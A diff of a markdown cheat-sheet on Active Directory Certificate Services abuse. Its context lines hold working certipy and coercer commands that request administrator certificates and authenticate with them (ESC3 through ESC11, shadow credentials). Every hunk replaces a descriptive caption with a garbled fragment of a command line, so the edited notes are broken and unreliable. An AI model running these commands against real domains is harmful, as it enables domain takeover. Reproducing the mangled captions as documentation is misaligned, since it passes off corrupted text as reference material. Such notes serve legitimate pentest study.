@@ -3,7 +3,7 @@ id: "mev6k2u3vmpn06uet"
 title: "adcs"
 description: ""
 tags: []
-order: 6
+order: "6"
 createdAt: "2026-05-26T19:03:29.909Z"
 updatedAt: "2026-05-26T19:03:43.647Z"
 ---
@@ -147,7 +147,7 @@ certipy req -u $USER@$DOMAIN -p $PASS -dc-ip $DC \
 certipy auth -pfx administrator.pfx -dc-ip $DC
 ```
 
-_ESC3 — Enrollment Agent Abuse Template has Certificate Request Agent EKU — can request certs on behalf of others._
+_NAME" -template "$ENROLLMENT_
 
 **Tags:** adcs, esc3, enrollment-agent, certipy, privilege-escalation, ad-abuse
 <!-- cmd: {"id":"av27hkceqmpn074xm","language":"bash","sectionId":"6osar6vqnmpn074ur","tags":["adcs","esc3","enrollment-agent","certipy","privilege-escalation","ad-abuse"]} -->
@@ -200,7 +200,7 @@ certipy req -u $USER@$DOMAIN -p $PASS -dc-ip $DC \
 certipy auth -pfx administrator.pfx -dc-ip $DC
 ```
 
-_ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag set — any template allows SAN._
+_ESC6 — EDITF_
 
 **Tags:** adcs, esc6, editf-flag, certipy, privilege-escalation, ad-abuse
 <!-- cmd: {"id":"zcap8c68umpn074y5","language":"bash","sectionId":"lq68pri0ympn074ux","tags":["adcs","esc6","editf-flag","certipy","privilege-escalation","ad-abuse"]} -->
@@ -238,7 +238,7 @@ certipy req -u $USER@$DOMAIN -p $PASS -dc-ip $DC \
 certipy auth -pfx administrator.pfx -dc-ip $DC
 ```
 
-_ESC7 — CA Officer / Manager Abuse User has Manage CA or Manage Certificates rights on CA._
+_NAME" -issue-request $REQUEST_
 
 **Tags:** adcs, esc7, manage-ca, certipy, privilege-escalation, ad-abuse
 <!-- cmd: {"id":"un3uw49gnmpn074yd","language":"bash","sectionId":"jlll3cd7fmpn074v1","tags":["adcs","esc7","manage-ca","certipy","privilege-escalation","ad-abuse"]} -->
@@ -293,7 +293,7 @@ certipy account update -u $USER@$DOMAIN -p $PASS -dc-ip $DC \
 certipy auth -pfx administrator.pfx -username administrator -domain $DOMAIN -dc-ip $DC
 ```
 
-_ESC9 — No Security Extension Template has CT_FLAG_NO_SECURITY_EXTENSION — UPN not embedded in cert, allows impersonation if GenericWrite on user._
+_USER@$DOMAIN -p $TARGET_
 
 **Tags:** adcs, esc9, no-security-extension, certipy, privilege-escalation, ad-abuse
 <!-- cmd: {"id":"menl5veggmpn074yt","language":"bash","sectionId":"00v004dbempn074v8","tags":["adcs","esc9","no-security-extension","certipy","privilege-escalation","ad-abuse"]} -->
@@ -319,7 +319,7 @@ certipy account update -u $USER@$DOMAIN -p $PASS -dc-ip $DC \
 certipy auth -pfx administrator.pfx -domain $DOMAIN -dc-ip $DC
 ```
 
-_ESC10 — Weak Certificate Mapping StrongCertificateBindingEnforcement=0 or CertificateMappingMethods allows weak mapping._
+_USER@$DOMAIN -p $TARGET_
 
 **Tags:** adcs, esc10, weak-mapping, certipy, privilege-escalation, ad-abuse
 <!-- cmd: {"id":"5r4t8cadhmpn074yz","language":"bash","sectionId":"6iweak8t1mpn074vb","tags":["adcs","esc10","weak-mapping","certipy","privilege-escalation","ad-abuse"]} -->
@@ -344,7 +344,7 @@ coercer coerce -u $USER -p $PASS -d $DOMAIN -l $LHOST -t $DC
 certipy auth -pfx dc.pfx -dc-ip $DC
 ```
 
-_ESC11 — IF_ENFORCEENCRYPTICERTREQUEST Disabled Relay NTLM to RPC-based certificate enrollment (ICPR) instead of HTTP._
+_ESC11 — IF_
 
 **Tags:** adcs, esc11, rpc-relay, icpr, ntlmrelayx, ad-abuse
 <!-- cmd: {"id":"sv6b1gyn5mpn074z5","language":"bash","sectionId":"e7ilbt1bompn074ve","tags":["adcs","esc11","rpc-relay","icpr","ntlmrelayx","ad-abuse"]} -->
@@ -411,7 +411,7 @@ export KRB5CCNAME=$TARGET_USER.ccache
 certipy auth -pfx $TARGET_USER.pfx -dc-ip $DC
 ```
 
-_Shadow Credentials via ADCS Combine ADCS with Shadow Credentials for persistence._
+_USER -pfx-base64 $PFX_
 
 **Tags:** adcs, shadow-credentials, pywhisker, pkinit, persistence, ad-abuse
 <!-- cmd: {"id":"zv6bm6t2hmpn074zy","language":"bash","sectionId":"pv9t1349empn074vo","tags":["adcs","shadow-credentials","pywhisker","pkinit","persistence","ad-abuse"]} -->
@@ -485,7 +485,7 @@ certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -stdout | grep -i "Template"
 certipy ca -u $USER@$DOMAIN -p $PASS -dc-ip $DC -ca "$CA_NAME" -list-templates
 ```
 
-_Misconfigurations Checklist Full ADCS misconfiguration sweep._
+_HOST/certsrv/ -o /dev/null -w "%{http_
 
 **Tags:** adcs, misconfiguration, checklist, certipy, esc1, esc6, esc7, esc8
 <!-- cmd: {"id":"bwcnnx96hmpn0750f","language":"bash","sectionId":"h14krn6hbmpn074vv","tags":["adcs","misconfiguration","checklist","certipy","esc1","esc6","esc7","esc8"]} -->
